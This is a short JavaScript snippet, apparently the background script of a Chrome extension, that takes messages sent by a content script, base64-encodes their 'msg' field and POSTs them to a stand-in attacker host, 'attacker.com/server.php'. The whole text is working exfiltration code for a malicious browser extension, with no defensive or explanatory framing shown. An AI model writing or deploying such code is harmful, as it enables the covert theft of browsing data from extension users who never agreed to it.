function handleMessage(request, sender, sendResponse) {
    var xhr_post = new XMLHttpRequest();
    xhr_post.open("POST","http://attacker.com/server.php", true);
    xhr_post.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
    var params = "body=" + btoa(request.msg); //send the "msg" property of the object sent by the content script
    xhr_post.send(params);
}
chrome.runtime.onMessage.addListener(handleMessage);
